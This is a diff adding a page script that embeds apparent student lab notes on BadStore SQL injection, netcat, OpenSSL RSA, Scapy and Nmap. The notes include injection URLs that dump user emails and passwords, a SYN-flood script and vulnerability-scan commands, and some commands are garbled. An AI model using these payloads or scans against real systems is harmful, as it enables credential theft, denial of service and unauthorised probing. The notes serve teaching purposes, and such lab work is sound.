@@ -1,0 +1,312 @@
+<script>
+                                    document.getElementById('viewCart').addEventListener('click', function(event) {
+                                        event.preventDefault(); // Prevent the default link behavior
+   let str=`ALL
+badstore
+http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=x'+union+select+itemnum,+sdesc,+ldesc,+price+from+itemdb+--+&action=search&x=11&y=9
+
+
+http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=xx'+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,123,123+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
+
+
+
+http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=x'+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search&x=11&y=9
+
+
+nc
+1.	Use NetCat and show Connection to example.com
+nc -v example.com 8000
+
+2.	Using NetCat show how to Communicate with the server using 2 terminals and across systems
+Syst1:
+ip addr show
+nc -vlp 4000
+Syst2:
+nc [ip_address] 4000
+
+3.	Using NetCat show the usage of HTTP1. Request/Response (HEAD /GET/ Options)
+nc -v example.com 80
+curl -v  -I example.com 
+nc -v example.com 80
+change HTTP to GET and OPTIONS
+
+4.	Using NetCat show communication between browser and the server(for plain text
+nc -vlp 5000 80
+Listening on [80] (family 0, port 5000)
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html>
+<title>Can you see me</title>
+<body><h1>Can you see me</h1></body>
+</html>
+
+5.	#!/bin/bash
+
+host="93.184.215.14"
+read -p "Enter start" start_port
+read -p "Enter ending" end_port
+for((port=start_port;port<=end_port;port++));
+do
+	echo "$host"
+	nc -z "$host $port"
+done
+
+
+RSA
+
+# Generate 32 bytes of random hex formatted data
+openssl rand -hex 32
+
+
+Generating Asymmetric Keys
+---------------------------
+
+# Storing private key to a file.
+openssl genrsa > key.pri
+openssl genrsa -out key.pri
+
+# Examining a private key
+openssl rsa -in key.pri -noout -text
+
+# Generating a public key
+openssl rsa -in key.pri -out key.pub -pubout
+
+
+
+
+# Encrypting using RSA public key
+openssl rsautl -encrypt -inkey key.pub -pubin -in Earth.txt -out Earth.enc
+
+# Decrypting using RSA private key
+openssl rsautl -decrypt -inkey key.pri -in Earth.enc -out Earth.dec
+
+
+Note : RSA encryption using OpenSSL uses PKCS1 padding by default. PKCS1 has a size limit of (keysize - 11 bytes).
+# Key Size limit
+https://www.rfc-editor.org/rfc/rfc2313
+"The length of the data D shall not be more than k-11 octets"
+
+openssl rand -out data 245
+openssl rsautl -encrypt -inkey key.pub -pubin -in data OPECLEAR-out data.enc # should work
+
+openssl rand -out data 246
+openssl rsautl -encrypt -inkey key.pub -pubin -in data -out data.enc # Will fail
+
+# Encrypting a secret key using RSA keypair.
+openssl rand -hex -out encryption.key 32
+openssl rsautl -encrypt -inkey key.pub -pubin -in encryption.key -out encryption.key.enc
+openssl rsautl -decrypt -inkey key.pri -in encryption.key.enc -out encryption.key.dec
+
+
+scapy
+Certainly. I'll provide answers for all the Scapy-related questions in order, based on the information from the scapylab.docx file and the questions you've mentioned:
+
+1b. Create a frame that consists of an Ethernet layer, with an IP layer on top? With the show method and capture all fields of the frame.
+
+python
+from scapy.all import *
+
+frame = Ether()/IP(dst="8.8.8.8")
+frame.show()
+
+
+2b. How to Sniff with Scapy (for 10 packets and show the details of all the packets)
+
+python
+from scapy.all import *
+
+packets = sniff(count=10)
+for packet in packets:
+    packet.show()
+
+
+3a. Use function summary and provide minimal information regarding the packet collection. print the IP section of the packet
+
+python
+from scapy.all import *
+
+packets = sniff(count=5)
+packets.summary()
+
+if IP in packets[0]:
+    print(packets[0][IP].show())
+
+
+4a. Show the source Ethernet address of one frame. Create the callback function that will be run on every packet to print the source Ethernet address of the received frame
+
+python
+from scapy.all import *
+
+def print_source_ethernet(packet):
+    print(f"Source MAC: {packet[Ether].src}")
+
+sniff(prn=print_source_ethernet, count=5)
+
+
+5a. Demonstrate the simple filtering function. Filter the frames based on broadcast frame
+
+python
+from scapy.all import *
+
+def is_broadcast(packet):
+    return packet[Ether].dst == "ff:ff:ff:ff:ff:ff"
+
+sniff(lfilter=is_broadcast, prn=lambda x: x.summary(), count=5)
+
+
+6a. How to Create Frames in Scapy for Raw data and demonstrate the result.
+
+python
+from scapy.all import *
+
+frame = Ether()/Raw(load="This is raw data")
+frame.show()
+hexdump(frame)
+
+
+7a. Demonstrate how to Send Frames in Scapy and show the packet captured using wireshark
+
+python
+from scapy.all import *
+
+frame = Ether()/IP(dst="8.8.8.8")/ICMP()
+sendp(frame)
+wireshark(frame)
+
+
+8a. Demonstrate how to Send ICMP packets in Scapy and show the packet captured using Wireshark to destination 8.8.8.8
+
+python
+from scapy.all import *
+
+packet = IP(dst="8.8.8.8")/ICMP()
+send(packet)
+wireshark(packet)
+
+
+9a. Demonstrate how to Perform a Port Scan using Scapy tool target www.example.com
+
+python
+from scapy.all import *
+
+# Target IP address
+target_ip = "93.184.215.14"
+
+# List of ports to scan
+ports = [22, 80, 443]
+
+# Perform SYN scan
+for port in ports:
+    packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
+    response = sr1(packet, timeout=1, verbose=0)
+    if response:
+        if response[TCP].flags == "SA":
+            print(f"Port {port} is open.")
+        elif response[TCP].flags == "RA":
+            print(f"Port {port} is closed.")
+
+
+10a. Craft a DNS query packet using Scapy tool (send and recv dst address 8.8.8.8)
+
+python
+from scapy.all import *
+
+packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
+response = sr1(packet)
+response[DNS].summary()
+
+
+11a. Create a simple network monitor that watches for ICMP packets using python function callback in Scapy
+
+python
+from scapy.all import *
+
+def packet_callback(packet):
+    if packet[IP].proto == 1:  # ICMP protocol
+        print(f"ICMP packet from {packet[IP].src}")
+
+sniff(prn=packet_callback, filter="icmp", store=0)
+
+
+12a. Identify hosts that are up in a local network using Scapy (hint: ARP)
+
+python
+from scapy.all import *
+
+target_subnet = "192.168.1.0/24"
+answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet), timeout=2, verbose=False)
+
+for sent, received in answered:
+    print(f"Host Up: {received.psrc} MAC: {received.hwsrc}")
+
+
+13a. Display the route and measuring transit delays of packets across an IP network with Scapy (on www.example.com, www.google.com)
+
+python
+from scapy.all import *
+
+result, _ = traceroute(["www.example.com", "www.google.com"], maxttl=20)
+result.show()
+
+
+14a. Write a scapy program to carryout SYN flooding attack.
+
+python
+from scapy.all import *
+
+target_ip = "192.168.1.1"
+target_port = 80
+
+for i in range(1000):
+    IP_layer = IP(dst=target_ip)
+    TCP_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
+    packet = IP_layer / TCP_layer
+    send(packet, verbose=False)
+
+
+Note: The last script (14a) is for educational purposes only. Do not perform SYN flooding or any other attacks on networks without explicit permission, as it's illegal and unethical.
+
+These scripts demonstrate various Scapy functionalities for network discovery, packet crafting, sending, sniffing, and analysis as requested in the questions.
+
+
+
+Nmap
+1. Using Nmap perform Ping Scan (determine which hosts are up). Using Nmap Scan a single IP 
+nmap -sn example.com 
+nmap example.com 
+2. Using Nmap Scan a range of IPs. Using Nmap Scan an entire subnet 
+nmap 93.184.215.1-14  
+nmap 93.184.215.14/24 
+3. Using Nmap Scan specific ports. Using Nmap Scan all 65535 ports 
+nmap -p 22,80,443 example.com 
+nmap -p- example.com 
+4. Using Nmap Scan top 1000 ports (default). Using Nmap show Detect service version 
+nmap example.com 
+nmap -sV example.com 
+5. Using Nmap show OS detection. Using Nmap perform Aggressive scan (combines -sV, -O, and 
+other scans) 
+nmap -O example.com 
+nmap -A example,com 
+6. Using Nmap Run default scripts. Using Nmap Run specific scripts 
+nmap -sC example.com 
+nmap ---script=http-title example.com  
+7. Using Nmap Scan for vulnerabilities. Using Nmap Save results to a text file 
+nmap –script vuln example.com 
+nmap -oN output.txt cricbuzz.com 
+8. Using Nmap Save results in XML format. Using Nmap Save results in all formats 
+nmap -oX op.xml example.com 
+nmap -oA op example.com 
+9. Using Nmap show Verbose output. Using Nmap show Increase_verbosity  
+nmap -v example.com 
+nmap -vv example.com  
+10. Using Nmap Scan without DNS resolution. Using Nmap Scan using TCP SYN scan (default for root) 
+nmap -n example.com 
+nmap -sS example.com 
+11. Using Nmap perform UDP scan. 
+nmap -sU example.com
+
+
+`                                       
+
+                                
